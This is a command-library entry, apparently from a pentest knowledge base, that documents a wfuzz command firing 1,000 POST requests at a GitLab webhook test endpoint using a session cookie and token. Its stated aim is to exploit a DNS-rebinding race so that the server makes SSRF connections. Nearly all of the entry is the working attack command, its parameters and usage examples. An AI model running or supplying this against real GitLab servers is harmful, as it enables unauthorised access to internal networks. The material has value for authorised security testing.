---
data: >-
  ./wfuzz -X POST -b "_gitlab_session=<session_id>;" -d
  "_method=post&authenticity_token=<token>" -z range,0-1000
  "https://<domain>/<user>/<repo>/hooks/<hook_id>/test?trigger=push_events&test=FUZZ"
tags:
  - fuzzing
  - web
type: command
executor: bash
platforms:
  - Linux
id: 85c76734-bdcb-471e-b8ea-5f1cd9379888
created_at: '2025-12-14T03:46:09.463Z'
updated_at: '2025-12-14T03:46:09.463Z'
verified: false
validated: true
submitted: true
---
# wfuzz-webhook-test

## Command

```bash
./wfuzz -X POST -b "_gitlab_session=<session_id>;" -d "_method=post&authenticity_token=<token>" -z range,0-1000 "https://<domain>/<user>/<repo>/hooks/<hook_id>/test?trigger=push_events&test=FUZZ"
```

## Description

Performs parallel POST requests to GitLab's webhook test endpoint to exploit ToCToU race via DNS rebinding.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -X POST | Use POST method | Yes |
| -b | Set cookie with session | Yes |
| -d | POST data with token | Yes |
| -z range,0-1000 | Iterate 0-1000 times | Yes |
| URL | Webhook test endpoint | Yes |

## Examples

### Basic Usage

```bash
./wfuzz -z range,1-10 "https://target/hooks/1/test"
```

### Advanced Usage

As above, with full params for GitLab.

## Expected Output

Multiple requests, eventually succeeding in SSRF connection to local listener; logs show response codes.

## Related

- [[procedures/Trigger-Web-Hook-Tests-with-Wfuzz]]
